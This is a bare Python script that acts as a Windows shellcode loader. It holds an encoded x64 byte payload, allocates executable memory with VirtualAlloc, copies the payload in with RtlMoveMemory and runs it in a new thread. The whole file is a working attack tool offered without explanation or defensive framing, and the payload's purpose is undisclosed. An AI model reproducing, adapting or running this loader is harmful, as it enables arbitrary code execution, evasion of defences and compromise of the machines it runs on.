import ctypes
import ctypes.wintypes as wt



buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\x31\x22\x04\x94\x3f"
buf += b"\xeb\xae\x68\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\xcd\x6a\x87\x70\xcf\x03\x6e\x68\x31"
buf += b"\x22\x45\xc5\x7e\xbb\xfc\x39\x67\x6a\x35\x46\x5a"
buf += b"\xa3\x25\x3a\x51\x6a\x8f\xc6\x27\xa3\x25\x3a\x11"
buf += b"\x6a\x8f\xe6\x6f\xa3\xa1\xdf\x7b\x68\x49\xa5\xf6"
buf += b"\xa3\x9f\xa8\x9d\x1e\x65\xe8\x3d\xc7\x8e\x29\xf0"
buf += b"\xeb\x09\xd5\x3e\x2a\x4c\x85\x63\x63\x55\xdc\xb4"
buf += b"\xb9\x8e\xe3\x73\x1e\x4c\x95\xef\x60\x2e\xe0\x31"
buf += b"\x22\x04\xdc\xba\x2b\xda\x0f\x79\x23\xd4\xc4\xb4"
buf += b"\xa3\xb6\x2c\xba\x62\x24\xdd\x3e\x3b\x4d\x3e\x79"
buf += b"\xdd\xcd\xd5\xb4\xdf\x26\x20\x30\xf4\x49\xa5\xf6"
buf += b"\xa3\x9f\xa8\x9d\x63\xc5\x5d\x32\xaa\xaf\xa9\x09"
buf += b"\xc2\x71\x65\x73\xe8\xe2\x4c\x39\x67\x3d\x45\x4a"
buf += b"\x33\xf6\x2c\xba\x62\x20\xdd\x3e\x3b\xc8\x29\xba"
buf += b"\x2e\x4c\xd0\xb4\xab\xb2\x21\x30\xf2\x45\x1f\x3b"
buf += b"\x63\xe6\x69\xe1\x63\x5c\xd5\x67\xb5\xf7\x32\x70"
buf += b"\x7a\x45\xcd\x7e\xb1\xe6\xeb\xdd\x02\x45\xc6\xc0"
buf += b"\x0b\xf6\x29\x68\x78\x4c\x1f\x2d\x02\xf9\x97\xce"
buf += b"\xdd\x59\xdd\x81\x9c\xdd\x5a\x6e\x11\x36\x94\x3f"
buf += b"\xaa\xf8\x21\xb8\xc4\x4c\x15\xd3\x4b\xaf\x68\x31"
buf += b"\x6b\x8d\x71\x76\x57\xac\x68\x12\x08\xc4\x3c\xfb"
buf += b"\x62\xef\x3c\x78\xab\xe0\xd8\xb6\x1a\xef\xd2\x7d"
buf += b"\x55\x22\x93\xc0\x3e\xe2\xe1\xdb\x4a\x05\x95\x3f"
buf += b"\xeb\xf7\x29\x8b\x0b\x84\xff\x3f\x14\x7b\x38\x61"
buf += b"\x6f\x35\x5d\x72\xda\x6e\x20\xce\xe2\x4c\x1d\xfd"
buf += b"\xa3\x51\xa8\x79\xab\xc5\xd5\x85\x01\xa1\xb7\xd1"
buf += b"\xdd\xd1\xdc\xb6\x2c\xc4\x78\x70\x7a\x48\x1d\xdd"
buf += b"\xa3\x27\x91\x70\x98\x9d\x31\x4b\x8a\x51\xbd\x79"
buf += b"\xa3\xc0\xd4\x3d\xeb\xae\x21\x89\x41\x69\xf0\x3f"
buf += b"\xeb\xae\x68\x31\x63\x54\xd5\x6f\xa3\x27\x8a\x66"
buf += b"\x75\x53\xd9\x0e\x2b\xc4\x65\x68\x63\x54\x76\xc3"
buf += b"\x8d\x69\x2c\x15\x76\x05\x95\x77\x66\xea\x4c\x29"
buf += b"\xe4\x04\xfc\x77\x62\x48\x3e\x61\x63\x54\xd5\x6f"
buf += b"\xaa\xfe\x21\xce\xe2\x45\xc4\x76\x14\x66\x25\xb8"
buf += b"\xe3\x48\x1d\xfe\xaa\x14\x11\xfd\x1d\x82\x6b\xea"
buf += b"\xa3\x9f\xba\x79\xdd\xce\x1f\x31\xaa\x14\x60\xb6"
buf += b"\x3f\x64\x6b\xea\x50\x5e\xdd\x93\x74\x45\x2e\x99"
buf += b"\x7e\x13\xf5\xce\xf7\x4c\x17\xfb\xc3\x92\x6e\x4d"
buf += b"\x28\x84\x6f\xdf\x9e\xab\xd3\x76\x31\x76\xfb\x55"
buf += b"\xeb\xf7\x29\xb8\xf8\xfb\x41\x3f\xeb\xae\x68"

#VirtualAlloc
VirtualAlloc=ctypes.windll.kernel32.VirtualAlloc
VirtualAlloc.argtypes=[wt.LPVOID,ctypes.c_size_t,wt.ULONG,wt.ULONG]
VirtualAlloc.restype=wt.LPVOID


#RtlMoveMemory
RtlMoveMemory=ctypes.windll.kernel32.RtlMoveMemory
RtlMoveMemory.argtypes=[wt.LPVOID,wt.LPVOID,ctypes.c_size_t]
RtlMoveMemory.restype=wt.LPVOID


#CreateThread
CreateThread=ctypes.windll.kernel32.CreateThread
CreateThread.argtypes=[wt.LPVOID,ctypes.c_size_t,wt.LPVOID,wt.LPVOID,wt.DWORD,wt.LPVOID]
CreateThread.restype=wt.HANDLE


#WaitForSingleObject
WaitForSingleObject=ctypes.windll.kernel32.WaitForSingleObject
WaitForSingleObject.argtypes=[wt.HANDLE,wt.DWORD]
WaitForSingleObject.restype=wt.DWORD




mem=VirtualAlloc(0,len(buf),0x3000,0x40)

print("[*]memory allocated at: {:X}\n".format(mem))

RtlMoveMemory(mem,buf,len(buf))
print("[*]Copy shellcode to memory\n")

th=CreateThread(0,0,mem,0,0,0)
WaitForSingleObject(th,0xFFFFFFFF)


